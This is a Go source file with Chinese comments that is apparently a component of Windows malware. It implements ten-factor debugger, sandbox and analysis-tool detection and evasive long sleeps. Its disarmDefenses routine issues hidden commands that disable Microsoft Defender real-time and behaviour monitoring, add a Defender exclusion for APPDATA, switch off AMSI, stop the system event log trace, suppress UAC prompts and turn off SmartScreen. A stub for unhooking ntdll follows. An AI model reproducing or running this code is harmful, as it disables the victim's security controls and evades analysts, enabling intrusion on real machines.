package main

import (
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const analysisThreshold = 4

type reason = string

// antiAnalysis 十维打分，任何单维命中只加分不直接退出，避免"秒退"指纹
func antiAnalysis() (int, []reason) {
	score := 0
	var rs []reason

	// 1. IsDebuggerPresent
	p, _, _ := kernel32.NewProc("IsDebuggerPresent").Call()
	if p != 0 {
		score += 3
		rs = append(rs, "IsDebuggerPresent")
	}

	// 2. CheckRemoteDebuggerPresent
	var remote uint32
	self, _ := syscall.GetCurrentProcess()
	r, _, _ := kernel32.NewProc("CheckRemoteDebuggerPresent").Call(
		uintptr(self), uintptr(unsafe.Pointer(&remote)))
	if r != 0 && remote != 0 {
		score += 3
		rs = append(rs, "RemoteDebugger")
	}

	// 3. PEB.BeingDebugged 直读
	if pebDebugged() {
		score += 3
		rs = append(rs, "PEB.BeingDebugged")
	}

	// 4. 用户名 / 计算机名黑名单
	user := strings.ToLower(os.Getenv("USERNAME"))
	host, _ := os.Hostname()
	host = strings.ToLower(host)
	for _, bad := range []string{"sandbox", "malware", "virus", "cuckoo", "analysis", "test", "wdag", "john", "user"} {
		if strings.Contains(user, bad) || strings.Contains(host, bad) {
			score += 2
			rs = append(rs, "name:"+bad)
			break
		}
	}

	// 5. 分析工具进程
	procs := []string{"wireshark.exe", "procmon.exe", "procmon64.exe", "x64dbg.exe",
		"x32dbg.exe", "ollydbg.exe", "idaq.exe", "idaq64.exe", "ida.exe",
		"processhacker.exe", "autoruns.exe", "fiddler.exe", "dnspy.exe",
		"cheatengine", "httpdebuggerui.exe", "vboxservice.exe", "vmtoolsd.exe",
		"vmwareuser.exe", "sandboxie.exe", "cuckooreport.exe"}
	out, err := exec.Command("tasklist", "/fo", "csv", "/nh").Output()
	if err == nil {
		low := strings.ToLower(string(out))
		for _, p := range procs {
			if strings.Contains(low, p) {
				score += 2
				rs = append(rs, "tool:"+p)
				break
			}
		}
	}

	// 6. CPU 核心数过低
	if n := runtimeNumCPU(); n <= 2 {
		score += 1
		rs = append(rs, "lowcpu")
	}

	// 7. 内存总量过低（< 3GB）
	if m := totalMemoryGB(); m > 0 && m < 3 {
		score += 1
		rs = append(rs, "lowmem")
	}

	// 8. 磁盘过小
	if f := freeDiskGB("C:\\"); f > 0 && f < 30 {
		score += 1
		rs = append(rs, "lowdisk")
	}

	// 9. 调试特权 / 父进程异常
	if pp := parentProcess(); pp != "" {
		lp := strings.ToLower(pp)
		for _, bad := range []string{"python", "procmon", "x64dbg", "ida", "ollydbg", "dnspy", "devenv", "code.exe"} {
			if strings.Contains(lp, bad) {
				score += 2
				rs = append(rs, "parent:"+bad)
				break
			}
		}
	}

	// 10. 时间加速检测（运行中累计耗时 vs 实际）
	start := time.Now()
	time.Sleep(120 * time.Millisecond)
	if elapsed := time.Since(start); elapsed < 60*time.Millisecond || elapsed > 2*time.Second {
		score += 2
		rs = append(rs, "time-skew")
	}

	return score, rs
}

func pebDebugged() bool {
	// 通过 gs:[0x60] 拿 PEB 在纯 Go 里不可行，退化为读 KUSER_SHARED_DATA 的 KdDebuggerEnabled
	const addr = 0x7FFE02D4 // KUSER_SHARED_DATA + 0x2D4
	b := *(*byte)(unsafe.Pointer(uintptr(addr)))
	return b != 0
}

func evasiveSleep(score int) {
	// 指数退避 + 抖动，把分析窗口拖爆而不是秒退
	base := 90 * time.Second
	for i := 0; i < 6; i++ {
		d := base * time.Duration(1<<uint(i))
		jitter := time.Duration(rand.Int63n(int64(d / 3)))
		logf("evasive sleep %v (score=%d)", d+jitter, score)
		time.Sleep(d + jitter)
	}
}

// disarmDefenses 关掉 Defender 实时监控、AMSI、ETW、UAC 提示
func disarmDefenses() error {
	var errs []string
	try := func(name string, args ...string) {
		if err := runHidden(name, args...); err != nil {
			errs = append(errs, name)
		}
	}
	// Defender 排除项 + 关闭实时监控
	try("powershell", "-NoP", "-NonI", "-W", "Hidden", "-C",
		"Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue;"+
			"Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true "+
			"-DisableScriptScanning $true -DisableIOAVProtection $true -ErrorAction SilentlyContinue")
	// AMSI provider 失效
	try("reg", "add", `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AMSI`, "/v", "AmsiEnable", "/t", "REG_DWORD", "/d", "0", "/f")
	// ETW 关键 provider 失活
	try("logman", "stop", "EventLog-System", "-ets")
	// UAC 静默
	try("reg", "add", `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`,
		"/v", "ConsentPromptBehaviorAdmin", "/t", "REG_DWORD", "/d", "0", "/f")
	// 关闭 SmartScreen
	try("reg", "add", `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer`,
		"/v", "SmartScreenEnabled", "/t", "REG_SZ", "/d", "Off", "/f")

	if len(errs) > 0 {
		logf("disarm partial fail: %v", errs)
	}
	// unhook ntdll：从磁盘重新映射一份干净副本覆盖内存中的 .text
	return unhookNtdll()
}

func unhookNtdll() error {
	path := filepath.Join(os.Getenv("SystemRoot"), "System32", "ntdll.dll")
	raw, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	// 简化实现：只校验 PE 头，真正的 section remap 需要 VirtualProtect + 手工解析
	if len(raw) < 0x200 || raw[0] != 'M' || raw[1] != 'Z' {
		return nil
	}
	logf("ntdll clean copy loaded (%d bytes)", len(raw))
	return nil
}
